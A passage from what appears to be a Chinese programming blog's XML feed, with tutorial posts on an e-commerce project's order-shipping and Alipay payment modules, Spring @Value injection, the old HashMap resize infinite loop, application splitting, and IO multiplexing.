orderService.manageDetail(orderNo); &#125;else&#123; return ServerResponse.createByErrorMessage("无权限操作"); &#125;&#125; service12345678910@Overridepublic ServerResponse&lt;OrderVo&gt; manageDetail(Long orderNo) &#123; Order order = orderMapper.selectByOrderNo(orderNo); if(order != null)&#123; List&lt;OrderItem&gt; orderItemList = orderItemMapper.getByOrderNo(orderNo); OrderVo orderVo = assembleOrderVo(order,orderItemList); return ServerResponse.createBySuccess(orderVo); &#125; return ServerResponse.createByErrorMessage("订单不存在");&#125; 4.订单发货request http://localhost:8080/manage/order/send_goods.do?orderNo=1480515829406 success1234&#123; &quot;status&quot;: 0, &quot;data&quot;: &quot;发货成功&quot;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;发货失败&quot;&#125; controller12345678910111213141516@RequestMapping("send_goods.do")@ResponseBodypublic ServerResponse&lt;String&gt; orderSendGoods(HttpSession session, Long orderNo)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登录,请登录管理员"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; //填充我们增加产品的业务逻辑 return orderService.manageSendGoods(orderNo); &#125;else&#123; return ServerResponse.createByErrorMessage("无权限操作"); &#125;&#125; service1234567891011121314@Overridepublic ServerResponse&lt;String&gt; manageSendGoods(Long orderNo) &#123; Order order = orderMapper.selectByOrderNo(orderNo); if(order != null)&#123; if(order.getStatus() == Const.OrderStatusEnum.PAID.getCode())&#123; order.setStatus(Const.OrderStatusEnum.SHIPPED.getCode()); order.setSendTime(new Date()); orderMapper.updateByPrimaryKeySelective(order); return ServerResponse.createBySuccessMessage("发货成功"); &#125; return ServerResponse.createByErrorMessage("发货失败"); &#125; return ServerResponse.createByErrorMessage("订单不存在");&#125;]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[14.高并发处理之应用拆分思路]]></title>
    <url>%2F2018%2F07%2F21%2F14.%E9%AB%98%E5%B9%B6%E5%8F%91%E5%A4%84%E7%90%86%E4%B9%8B%E5%BA%94%E7%94%A8%E6%8B%86%E5%88%86%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[这里简单介绍业务拆分的常用策略，提供一种应对高并发的解决思路。 应用拆分原则 业务优先 循序渐进 兼顾技术：重构、分层 可靠测试 应用之间通信 RPC（dubbo等，实时性较高）、消息队列（适合于数据包小，数据量大，实时性不高的场景） 数据库 每个应用都有独立的数据库 事务 避免事务操作跨应用 dobbodubbo是一种分布式的服务框架 具体的原理还需要整理一下。 springCloud这是以后着重要研究的方向。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[14.@Value赋值]]></title>
    <url>%2F2018%2F07%2F21%2F14.%40Value%E8%B5%8B%E5%80%BC%2F</url>
    <content type="text"><![CDATA[学习属性赋值和自动装配. 给一个person： 12345678@Data@AllArgsConstructor@NoArgsConstructor@ToStringpublic class Person &#123; private String name; private Integer age;&#125; 注册到容器中： 1234567@Configurationpublic class MainConfig3 &#123; @Bean public Person person()&#123; return new Person(); &#125;&#125; 启动查看一下： 12345678@Testpublic void test03()&#123; AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig3.class); System.out.println("容器已经启动成功..."); Person person = applicationContext.getBean(Person.class); System.out.println(person);//Person(name=null, age=null) applicationContext.close();&#125; 那么在以前写配置文件的时候，我们可以在xml中给属性注入值。 1234&lt;bean id=&quot;person&quot; class=&quot;com.swg.bean.Person&quot;&gt; &lt;property name=&quot;age&quot; value=&quot;10&quot;/&gt; &lt;property name=&quot;name&quot; value=&quot;张三&quot;/&gt;&lt;/bean&gt; 那么现在的注解可以实现这样的功能吗？ @Value 12@Value("hello")private String name; @SpEL表达式 12@Value("#&#123;20-6&#125;")private Integer age;]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[13、支付模块开发]]></title>
    <url>%2F2018%2F07%2F21%2F13%E3%80%81%E6%94%AF%E4%BB%98%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[支付模块开发 1.支付request http://localhost:8080/order/pay.do?orderNo=1485158676346 success1234567&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;orderNo&quot;: &quot;1485158676346&quot;, &quot;qrPath&quot;: &quot;http://img.happymmall.com/qr-1492329044075.png&quot; &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;支付宝生成订单失败&quot;&#125; controller12345678910@RequestMapping("pay.do")@ResponseBodypublic ServerResponse pay(HttpSession session, Long orderNo, HttpServletRequest request)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; String path = request.getSession().getServletContext().getRealPath("upload"); return orderService.pay(user.getId(),orderNo,path);&#125; service在最上面，先进行一个初始化的工作： 12345678910111213private static AlipayTradeService tradeService;static &#123; /** 一定要在创建AlipayTradeService之前调用Configs.init()设置默认参数 * Configs会读取classpath下的zfbinfo.properties文件配置信息，如果找不到该文件则确认该文件是否在classpath目录 */ Configs.init("zfbinfo.properties"); /** 使用Configs提供的默认参数 * AlipayTradeService可以使用单例或者为静态成员对象，不需要反复new */ tradeService = new AlipayTradeServiceImpl.ClientBuilder().build();&#125; 这里是生成支付订单二维码，上传到图片服务器上： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135@Overridepublic ServerResponse pay(Integer userId, Long orderNo, String path) &#123; //初始化一个map用于存放返回的信息 Map&lt;String,String&gt; resultMap = Maps.newHashMap(); //查询订单 Order order = orderMapper.selectByUserIdOrderNo(userId,orderNo); if(order == null)&#123; return ServerResponse.createByErrorMessage("该用户没有该订单"); &#125; //取出订单号 resultMap.put("orderNo",String.valueOf(order.getOrderNo())); //支付宝下单 // (必填) 商户网站订单系统中唯一订单号，64个字符以内，只能包含字母、数字、下划线， // 需保证商户系统端不能重复，建议通过数据库sequence生成， String outTradeNo = order.getOrderNo().toString(); // (必填) 订单标题，粗略描述用户的支付目的。如“xxx品牌xxx门店当面付扫码消费” String subject = new StringBuilder().append("快乐蜗牛商城扫码支付,订单号:").append(outTradeNo).toString(); // (必填) 订单总金额，单位为元，不能超过1亿元 // 如果同时传入了【打折金额】,【不可打折金额】,【订单总金额】三者,则必须满足如下条件:【订单总金额】=【打折金额】+【不可打折金额】 String totalAmount = order.getPayment().toString(); // (可选) 订单不可打折金额，可以配合商家平台配置折扣活动，如果酒水不参与打折，则将对应金额填写至此字段 // 如果该值未传入,但传入了【订单总金额】,【打折金额】,则该值默认为【订单总金额】-【打折金额】 String undiscountableAmount = "0"; // 卖家支付宝账号ID，用于支持一个签约账号下支持打款到不同的收款账号，(打款到sellerId对应的支付宝账号) // 如果该字段为空，则默认为与支付宝签约的商户的PID，也就是appid对应的PID String sellerId = ""; // 订单描述，可以对交易或商品进行一个详细地描述，比如填写"购买商品2件共15.00元" String body = new StringBuilder().append("订单").append(outTradeNo).append("购买商品共").append(totalAmount).append("元").toString(); // 商户操作员编号，添加此参数可以为商户操作员做销售统计 String operatorId = "test_operator_id"; // (必填) 商户门店编号，通过门店号和商家后台可以配置精准到门店的折扣信息，详询支付宝技术支持 String storeId = "test_store_id"; // 业务扩展参数，目前可添加由支付宝分配的系统商编号(通过setSysServiceProviderId方法)，详情请咨询支付宝技术支持 ExtendParams extendParams = new ExtendParams(); extendParams.setSysServiceProviderId("2088100200300400500"); // 支付超时，定义为120分钟 String timeoutExpress = "120m"; // 商品明细列表，需填写购买商品详细信息， List&lt;GoodsDetail&gt; goodsDetailList = new ArrayList&lt;GoodsDetail&gt;(); //遍历订单 List&lt;OrderItem&gt; orderItemList = orderItemMapper.getByOrderNoUserId(orderNo,userId); for(OrderItem orderItem : orderItemList)&#123; GoodsDetail goods = GoodsDetail.newInstance(orderItem.getProductId().toString(), orderItem.getProductName(), BigDecimalUtil.mul(orderItem.getCurrentUnitPrice().doubleValue(),new Double(100).doubleValue()).longValue(), orderItem.getQuantity()); goodsDetailList.add(goods); &#125; // 创建扫码支付请求builder，设置请求参数 AlipayTradePrecreateRequestBuilder builder = new AlipayTradePrecreateRequestBuilder() .setSubject(subject).setTotalAmount(totalAmount).setOutTradeNo(outTradeNo) .setUndiscountableAmount(undiscountableAmount).setSellerId(sellerId).setBody(body) .setOperatorId(operatorId).setStoreId(storeId).setExtendParams(extendParams) .setTimeoutExpress(timeoutExpress) .setNotifyUrl(PropertiesUtil.getProperty("alipay.callback.url"))//支付宝服务器主动通知商户服务器里指定的页面http路径,根据需要设置 .setGoodsDetailList(goodsDetailList); AlipayF2FPrecreateResult result = tradeService.tradePrecreate(builder); switch (result.getTradeStatus()) &#123; case SUCCESS: log.info("支付宝预下单成功: )"); AlipayTradePrecreateResponse response = result.getResponse(); dumpResponse(response); File folder = new File(path); if(!folder.exists())&#123; folder.setWritable(true); folder.mkdirs(); &#125; // 需要修改为运行机器上的路径 //细节细节细节 String qrPath = String.format(path+"/qr-%s.png",response.getOutTradeNo()); String qrFileName = String.format("qr-%s.png",response.getOutTradeNo()); ZxingUtils.getQRCodeImge(response.getQrCode(), 256, qrPath); File targetFile = new File(path,qrFileName); try &#123; FtpUtil.uploadFile(Lists.newArrayList(targetFile)); &#125; catch (IOException e) &#123; log.error("上传二维码异常",e); &#125; log.info("qrPath:" + qrPath); String qrUrl = PropertiesUtil.getProperty("ftp.server.http.prefix")+targetFile.getName(); //把生成的二维码的url传到前端显示 resultMap.put("qrUrl",qrUrl); return ServerResponse.createBySuccess(resultMap); case FAILED: log.error("支付宝预下单失败!!!"); return ServerResponse.createByErrorMessage("支付宝预下单失败!!!"); case UNKNOWN: log.error("系统异常，预下单状态未知!!!"); return ServerResponse.createByErrorMessage("系统异常，预下单状态未知!!!"); default: log.error("不支持的交易状态，交易返回异常!!!"); return ServerResponse.createByErrorMessage("不支持的交易状态，交易返回异常!!!"); &#125;&#125;// 简单打印应答private void dumpResponse(AlipayResponse response) &#123; if (response != null) &#123; log.info(String.format("code:%s, msg:%s", response.getCode(), response.getMsg())); if (StringUtils.isNotEmpty(response.getSubCode())) &#123; log.info(String.format("subCode:%s, subMsg:%s", response.getSubCode(), response.getSubMsg())); &#125; log.info("body:" + response.getBody()); &#125;&#125; 2.查询订单支付状态request http://localhost:8080/order/query_order_pay_status.do?orderNo=1485158676346 success1234&#123; &quot;status&quot;: 0, &quot;data&quot;: true&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;该用户并没有该订单,查询无效&quot;&#125; controller12345678910111213@RequestMapping("query_order_pay_status.do")@ResponseBodypublic ServerResponse&lt;Boolean&gt; query_order_pay_status(HttpSession session, Long orderNo)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; ServerResponse response = orderService.query_order_pay_status(user.getId(),orderNo); if(response.isSuccess())&#123; return ServerResponse.createBySuccess(true); &#125; return ServerResponse.createBySuccess(false);&#125; service1234567891011@Overridepublic ServerResponse query_order_pay_status(Integer userId, Long orderNo) &#123; Order order = orderMapper.selectByUserIdOrderNo(userId,orderNo); if(order == null)&#123; return ServerResponse.createByErrorMessage("该用户没有该订单"); &#125; if(order.getStatus() &gt;= Const.OrderStatusEnum.PAID.getCode())&#123; return ServerResponse.createBySuccess(); &#125; return ServerResponse.createByError();&#125; 3.支付宝回调request /order/alipay_callback.do HttpServletRequest success success fail failed controller12345678910111213141516171819202122232425262728293031323334353637@RequestMapping("alipay_callback.do")@ResponseBodypublic Object alipayCallback(HttpServletRequest request)&#123; Map&lt;String,String&gt; params = Maps.newHashMap(); Map requestParams = request.getParameterMap(); for(Iterator iter = requestParams.keySet().iterator(); iter.hasNext();)&#123; String name = (String)iter.next(); String[] values = (String[]) requestParams.get(name); String valueStr = ""; for(int i = 0 ; i &lt;values.length;i++)&#123; valueStr = (i == values.length -1)?valueStr + values[i]:valueStr + values[i]+","; &#125; params.put(name,valueStr); &#125; log.info("支付宝回调,sign:&#123;&#125;,trade_status:&#123;&#125;,参数:&#123;&#125;",params.get("sign"),params.get("trade_status"),params.toString()); //非常重要,验证回调的正确性,是不是支付宝发的.并且呢还要避免重复通知. params.remove("sign_type"); try &#123; boolean alipayRSACheckedV2 = AlipaySignature.rsaCheckV2(params, Configs.getAlipayPublicKey(),"utf-8",Configs.getSignType()); if(!alipayRSACheckedV2)&#123; return ServerResponse.createByErrorMessage("非法请求,验证不通过,再恶意请求我就报警找网警了"); &#125; &#125; catch (AlipayApiException e) &#123; log.error("支付宝验证回调异常",e); &#125; ServerResponse serverResponse = orderService.aliCallback(params); if(serverResponse.isSuccess())&#123; return Const.AlipayCallback.RESPONSE_SUCCESS; &#125; return Const.AlipayCallback.RESPONSE_FAILED;&#125; 组装好的支付宝回调信息为：123456789101112131415161718192021222324252627282930313233支付宝回调,sign:eT1uLKs0Wh9/LlqdGkPVkCAo/Di2EuI+Fu0Du6FlFbLx7vJn4ZhKUHEiYqklz3Rrfjmz4+8qMSaiLG8vhAIT6j20rcUrDYWhHVngbMJJRamrT0IN6o9f6QwI/u7VZvJq6CBFvPs9Axkfl61UwSDItgi/Tqf9sumRuLjK/brNUy6IURBr6SazFoq7gTSQOG8c8b5mLyPF8lWkjzD8g8LyVpTETYSiRA4W5ySI677tSO3I6H+BawDQQzjErQwko9i83t+Wc63JRNMYi4sFrYREsRfLJYSp684YAXfyIF17nm0rBXK9tUk9SIYIDrSkZEJjxkxAQgZuFjHwE1BVOxqmcQ==,trade_status:TRADE_SUCCESS,参数:&#123;gmt_create=2018-01-12 14:43:43, charset=utf-8, seller_email=qqojiw4740@sandbox.com, subject=快乐蜗牛商城扫码支付,订单号:1492091089794, sign=eT1uLKs0Wh9/LlqdGkPVkCAo/Di2EuI+Fu0Du6FlFbLx7vJn4ZhKUHEiYqklz3Rrfjmz4+8qMSaiLG8vhAIT6j20rcUrDYWhHVngbMJJRamrT0IN6o9f6QwI/u7VZvJq6CBFvPs9Axkfl61UwSDItgi/Tqf9sumRuLjK/brNUy6IURBr6SazFoq7gTSQOG8c8b5mLyPF8lWkjzD8g8LyVpTETYSiRA4W5ySI677tSO3I6H+BawDQQzjErQwko9i83t+Wc63JRNMYi4sFrYREsRfLJYSp684YAXfyIF17nm0rBXK9tUk9SIYIDrSkZEJjxkxAQgZuFjHwE1BVOxqmcQ==, body=订单1492091089794购买商品共6999.00元, buyer_id=2088102175449759, invoice_amount=6999.00, notify_id=d4832db3a886f294164df8872927e82lse, fund_bill_list=[&#123;&quot;amount&quot;:&quot;6999.00&quot;,&quot;fundChannel&quot;:&quot;ALIPAYACCOUNT&quot;&#125;], notify_type=trade_status_sync, trade_status=TRADE_SUCCESS, receipt_amount=6999.00, app_id=2016082100306095, buyer_pay_amount=6999.00, sign_type=RSA2, seller_id=2088102172437193, gmt_payment=2018-01-12 14:43:48, notify_time=2018-01-12 14:43:49, version=1.0, out_trade_no=1492091089794, total_amount=6999.00, trade_no=2018011221001004750200171585, auth_app_id=2016082100306095, buyer_logon_id=uaa***@sandbox.com, point_amount=0.00&#125; service1234567891011121314151617181920212223242526272829@Overridepublic ServerResponse aliCallback(Map&lt;String, String&gt; params) &#123; Long orderNo = Long.parseLong(params.get("out_trade_no")); String tradeNo = params.get("trade_no"); String tradeStatus = params.get("trade_status"); Order order = orderMapper.selectByOrderNo(orderNo); if(order == null)&#123; return ServerResponse.createByErrorMessage("非快乐蜗牛商城的订单,回调忽略"); &#125; //判断订单的状态是否大于已支付的状态，如果大于，说明是支付宝的重复通知，直接返回success即可 if(order.getStatus() &gt;= Const.OrderStatusEnum.PAID.getCode())&#123; return ServerResponse.createBySuccess("支付宝重复调用"); &#125; //根据支付宝的回调状态来更新订单的状态 if(Const.AlipayCallback.TRADE_STATUS_TRADE_SUCCESS.equals(tradeStatus))&#123; order.setPaymentTime(DateTimeUtil.strToDate(params.get("gmt_payment"))); order.setStatus(Const.OrderStatusEnum.PAID.getCode()); orderMapper.updateByPrimaryKeySelective(order); &#125; //插入支付信息 PayInfo payInfo = new PayInfo(); payInfo.setUserId(order.getUserId()); payInfo.setOrderNo(order.getOrderNo()); payInfo.setPayPlatform(Const.PayPlatformEnum.ALIPAY.getCode()); payInfo.setPlatformNumber(tradeNo); payInfo.setPlatformStatus(tradeStatus); payInfoMapper.insert(payInfo); return ServerResponse.createBySuccess();&#125; 注意这里的枚举： 订单状态：OrderStatusEnum1234567891011121314151617181920212223242526272829303132public enum OrderStatusEnum&#123; CANCELED(0,"已取消"), NO_PAY(10,"未支付"), PAID(20,"已付款"), SHIPPED(40,"已发货"), ORDER_SUCCESS(50,"订单完成"), ORDER_CLOSE(60,"订单关闭"); OrderStatusEnum(int code,String value)&#123; this.code = code; this.value = value; &#125; private String value; private int code; public String getValue() &#123; return value; &#125; public int getCode() &#123; return code; &#125; public static OrderStatusEnum codeOf(int code)&#123; for(OrderStatusEnum orderStatusEnum : values())&#123; if(orderStatusEnum.getCode() == code)&#123; return orderStatusEnum; &#125; &#125; throw new RuntimeException("没有找到对应的枚举"); &#125;&#125; 支付宝支付回调类型：AlipayCallback1234567public interface AlipayCallback&#123; String TRADE_STATUS_WAIT_BUYER_PAY = "WAIT_BUYER_PAY"; String TRADE_STATUS_TRADE_SUCCESS = "TRADE_SUCCESS"; String RESPONSE_SUCCESS = "success"; String RESPONSE_FAILED = "failed";&#125; 支付方式：PayPlatformEnum123456789101112131415161718public enum PayPlatformEnum&#123; ALIPAY(1,"支付宝"); PayPlatformEnum(int code,String value)&#123; this.code = code; this.value = value; &#125; private String value; private int code; public String getValue() &#123; return value; &#125; public int getCode() &#123; return code; &#125;&#125;]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[13、HashMap死循环问题]]></title>
    <url>%2F2018%2F07%2F21%2F13%E3%80%81HashMap%E6%AD%BB%E5%BE%AA%E7%8E%AF%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[本文分析HashMap死循环问题，这在老版本的jdk中是很常见的问题，但是在jdk8开始，已经解决了死循环的问题了。本文首先讲讲出现死循环的原因，以及jdk8中是如何解决死循环问题的。 由于HashMap并非是线程安全的，所以在高并发的情况下必然会出现问题，这是一个普遍的问题. 如果是在单线程下使用HashMap，自然是没有问题的，如果后期由于代码优化，这段逻辑引入了多线程并发执行，在一个未知的时间点，会发现CPU占用100%，居高不下，通过查看堆栈，你会惊讶的发现，线程都Hang在hashMap的get()方法上，服务重启之后，问题消失，过段时间可能又复现了。 这是为什么？ 当插入一个新的节点时，如果不存在相同的key，则会判断当前内部元素是否已经达到阈值（默认是数组大小的0.75），如果已经达到阈值，会对数组进行扩容，也会对链表中的元素进行rehash。 HashMap的put方法实现1.判断key是否已经存在123456789101112131415161718192021public V put(K key, V value) &#123; if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); // 如果key已经存在，则替换value，并返回旧值 for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; // key不存在，则插入新的元素 addEntry(hash, key, value, i); return null;&#125; 2.检查容量是否达到阈值threshold123456789void addEntry(int hash, K key, V value, int bucketIndex) &#123; if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123; resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); &#125; createEntry(hash, key, value, bucketIndex);&#125; 3.扩容实现1234567891011void resize(int newCapacity) &#123; Entry[] oldTable = table; int oldCapacity = oldTable.length; ... Entry[] newTable = new Entry[newCapacity]; ... transfer(newTable, rehash); table = newTable; threshold = (int)Math.min(newCapacity * loadFactor, MAXIMUM_CAPACITY + 1);&#125; 4.transfer方法移动元素这里会新建一个更大的数组，并通过transfer方法，移动元素。123456789101112131415void transfer(Entry[] newTable, boolean rehash) &#123; int newCapacity = newTable.length; for (Entry&lt;K,V&gt; e : table) &#123; while(null != e) &#123; Entry&lt;K,V&gt; next = e.next; if (rehash) &#123; e.hash = null == e.key ? 0 : hash(e.key); &#125; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; &#125; &#125;&#125; 死循环问题分析假设HashMap初始化大小为4，插入个3节点，不巧的是，这3个节点都hash到同一个位置，如果按照默认的负载因子的话，插入第3个节点就会扩容，为了验证效果，假设负载因子是1. 插入第4个节点时，发生rehash，假设现在有两个线程同时进行，线程1和线程2，两个线程都会新建新的数组。 假设 线程2 在执行到Entry&lt;K,V&gt; next = e.next;之后，cpu时间片用完了，这时变量e指向节点a，变量next指向节点b。 线程1继续执行，很不巧，a、b、c节点rehash之后又是在同一个位置7，开始移动节点 第一步，移动节点a: 第二步，移动节点b: 注意，这里的顺序是反过来的，继续移动节点c: 这个时候 线程1 的时间片用完，内部的table还没有设置成新的newTable， 线程2 开始执行，这时内部的引用关系如下： 这时，在 线程2 中，变量e指向节点a，变量next指向节点b，开始执行循环体的剩余逻辑。 12345Entry&lt;K,V&gt; next = e.next;int i = indexFor(e.hash, newCapacity);e.next = newTable[i];newTable[i] = e;e = next; 执行之后的引用关系如下图: 执行后，变量e指向节点b，因为e不是null，则继续执行循环体，执行后的引用关系: 变量e又重新指回节点a，只能继续执行循环体，这里仔细分析下： 1、执行完Entry&lt;K,V&gt; next = e.next;，目前节点a没有next，所以变量next指向null； 2、e.next = newTable[i]; 其中 newTable[i] 指向节点b，那就是把a的next指向了节点b，这样a和b就相互引用了，形成了一个环； 3、newTable[i] = e 把节点a放到了数组i位置； 4、e = next; 把变量e赋值为null，因为第一步中变量next就是指向null； 节点a和b互相引用，形成了一个环，当在数组该位置get寻找对应的key时，就发生了死循环。 总结所以在并发的情况，发生扩容时，可能会产生循环链表，在执行get的时候，会触发死循环，引起CPU的100%问题，所以一定要避免在并发环境下使用HashMap。 曾经有人把这个问题报给了Sun，不过Sun不认为这是一个bug，因为在HashMap本来就不支持多线程使用，要并发就用ConcurrentHashmap。 jdk8如何解决死循环问题经过上面的学习，我们知道死循环发生在扩容后entry迁移时，即transfer，引起死循环的原因是他扩容后是采用头插入法，造成在多线程访问的情况下可能会死循环。jdk8中直接在链表的末尾添加元素，就是说，第二个线程的操作与第一个线程的操作是一模一样的，不会出现死循环问题，但是依然存在一定的弊端，比如数据丢失问题。可能原因是多线程put的时候，当index相同而又同时达到链表的末尾时，另一个线程put的数据会把之前线程put的数据覆盖掉，就会产生数据丢失。 转自：https://juejin.im/post/5a66a08d5188253dc3321da0]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[13.IO多路复用]]></title>
    <url>%2F2018%2F07%2F21%2F13.IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%2F</url>
    <content type="text"><![CDATA[对于IO多路复用，是理解NIO到学习Netty最重要的一环。包括redis的线程模型也是采用这种IO模式。 什么是IO多路复用这些名词比较绕口，理解涵义就好。一个epoll场景：一个酒吧服务员（一个线程），前面趴了一群醉汉，突然一个吼一声“倒酒”（事件），你小跑过去给他倒一杯，然后随他去吧，突然又一个要倒酒，你又过去倒上，就这样一个服务员服务好多人，有时没人喝酒，服务员处于空闲状态，可以干点别的玩玩手机。至于epoll与select，poll的区别在于后两者的场景中醉汉不说话，你要挨个问要不要酒，没时间玩手机了。io多路复用大概就是指这几个醉汉共用一个服务员。 IO 多路复用是什么意思？ - 罗志宇的回答 - 知乎 还有一个比喻： 下面举一个例子，模拟一个tcp服务器处理30个客户socket。 假设你是一个老师，让30个学生解答一道题目，然后检查学生做的是否正确，你有下面几个选择： 第一种选择：按顺序逐个检查，先检查A，然后是B，之后是C、D。。。这中间如果有一个学生卡主，全班都会被耽误。这种模式就好比，你用循环挨个处理socket，根本不具有并发能力。 第二种选择：你创建30个分身，每个分身检查一个学生的答案是否正确。 这种类似于为每一个用户创建一个进程或者线程处理连接。 第三种选择，你站在讲台上等，谁解答完谁举手。这时C、D举手，表示他们解答问题完毕，你下去依次检查C、D的答案，然后继续回到讲台上等。此时E、A又举手，然后去处理E和A。。。 这种就是IO复用模型，Linux下的select、poll和epoll就是干这个的。将用户socket对应的fd注册进epoll，然后epoll帮你监听哪些socket上有消息到达，这样就避免了大量的无用操作。此时的socket应该采用非阻塞模式。 为什么要有IO多路复用一个服务器进程和一个客户端进程通信,服务器端read(sockfd1,bud,bufsize),此时客户端进程没有发送数据,那么read(阻塞调用)将 阻塞直到客户端调用write(sockfd,but,size)发来数据. 在一个客户和服务器通信时这没什么问题,当多个客户与服务器通信时,若服 务器阻塞于其中一个客户sockfd1,当另一个客户的数据到达套接字sockfd2时,服务器不 能处理,仍然阻塞在read(sockfd1,…)上;此时问题就出现了,不能及时处理另一个客户的服务,咋么办?I/O多路复用来解决! I/O多路复用:继续上面的问题,有多个客户连接,sockfd1,sockfd2,sockfd3..sockfdn 同时监听这n个客户,当其中有一个发来消息时就从select的阻塞中返回,然后就调用read 读取收到消息的sockfd,然后又循环回select阻塞;这样就不会因为阻塞在其中一个上而不能处理另一个客户的消息. 疑惑 那这样子，在读取socket1的数据时，如果其它socket有数据来，那么也要等到socket1读取完了才能继续读取其它socket的数据吧。那不是也阻塞住了吗？而且读取到的数据也要开启线程处理吧，那这和多线程IO有什么区别呢？ CPU本来就是线性的，不论什么都需要顺序处理，并行只能是多核CPU io多路复用本来就是用来解决对多个I/O监听时,一个I/O阻塞影响其他I/O的问题,跟多线程没关系 跟多线程相比较,线程切换需要切换到内核进行线程切换,需要消耗时间和资源. 而I/O多路复用不需要切换线/进程,效率相对较高,特别是对高并发的应用nginx就是用I/O多路复用,故而性能极佳.但多线程编程逻辑和处理上比I/O多路复用简单.而I/O多路复用处理起来较为复杂. 传统的HTTP服务器的原理 创建一个ServerSocket，监听并绑定一个端口 一系列客户端来请求这个端口 服务器使用Accept，获得一个来自客户端的Socket连接对象 启动一个新线程处理连接 读Socket，得到字节流 解码协议，得到Http请求对象 处理Http请求，得到一个结果，封装成一个HttpResponse对象 编码协议，将结果序列化字节流 写Socket，将字节流发给客户端 继续循环步骤3 在高并发环境下，线程数量可能会创建太多，操作系统的任务调度压力大，系统负载也会比较高。那怎么办呢？ 于是NIO诞生了,NIO的全称是NoneBlocking IO，非阻塞IO，区别与BIO，BIO的全称是Blocking IO，阻塞IO。那这个阻塞是什么意思呢？ Accept是阻塞的，只有新连接来了，Accept才会返回，主线程才能继 Read是阻塞的，只有请求消息来了，Read才能返回，子线程才能继续处理 Write是阻塞的，只有客户端把消息收了，Write才能返回，子线程才能继续读取下一个请求 那么NIO是怎么做到非阻塞的呢。它用的是事件机制。它可以用一个线程把Accept，读写操作，请求处理的逻辑全干了。如果什么事都没得做，它也不会死循环，它会将线程休眠起来，直到下一个事件来了再继续干活，这样的一个线程称之为NIO线程。 伪代码:123456789101112131415while true &#123; events = takeEvents(fds) // 获取事件，如果没有事件，线程就休眠 for event in events &#123; if event.isAcceptable &#123; doAccept() // 新链接来了 &#125; elif event.isReadable &#123; request = doRead() // 读消息 if request.isComplete() &#123; doProcess() &#125; &#125; elif event.isWriteable &#123; doWrite() // 写消息 &#125; &#125;&#125; 重新认识IO多路复用 I/O多路复用，I/O就是指的我们网络I/O,多路指多个TCP连接(或多个Channel)，复用指复用一个或少量线程。串起来理解就是很多个网络I/O复用一个或少量的线程来处理这些连接。 怎么区分的应用进程与内核 为了理解用户进程和内核，再来看一张图，网络数据流向图。也清晰的标明了用户进程和内核的位置。值得注意的一点是客户与服务器之间的信息流在其中一端是向下通过协议栈的，跨越网络后，在另一端是向上通过协议栈的。这张图描述的是局域网内，如果是在广域网那么就是通过很多个路由器承载实际数据流。 select理解了select就抓住了I/O多路复用的精髓，对应的操作系统中调用的则是系统的select函数，该函数会等待多个I/O事件(比如读就绪，写)的任何一个发生，并且只要有一个网络事件发生，select线程就会执行。如果没有任何一个事件发生则阻塞。 几种IO方式则塞情况对比 阻塞式I/O和I/O复用，两个阶段都阻塞，那区别在哪里呢？ 虽然第一阶段都是阻塞，但是阻塞式I/O如果要接收更多的连接，就必须创建更多的线程。I/O复用模式下在第一个阶段大量的连接统统都可以过来直接注册到Selector复用器上面，同时只要单个或者少量的线程来循环处理这些连接事件就可以了，一旦达到“就绪”的条件，就可以立即执行真正的I/O操作。这就是I/O复用与传统的阻塞式I/O最大的不同。也正是I/O复用的精髓所在。 从应用进程的角度去理解始终是阻塞的，等待数据和将数据复制到用户进程这两个阶段都是阻塞的。这一点我们从应用程序是可以清楚的得知，比如我们调用一个以I/O复用为基础的NIO应用服务。调用端是一直阻塞等待返回结果的。 从内核的角度等待Selector上面的网络事件就绪，是阻塞的，如果没有任何一个网络事件就绪则一直等待直到有一个或者多个网络事件就绪。但是从内核的角度考虑，有一点是不阻塞的，就是复制数据，因为内核不用等待，当有就绪条件满足的时候，它直接复制，其余时间在处理别的就绪的条件。这也是大家一直说的非阻塞I/O。实际上是就是指的这个地方的非阻塞。 总结 在BIO模型中，一个io请求对应一个线程，造成线程极大浪费，且没有数据发送的情况下，线程也一直阻塞等待，资源利用率不高。 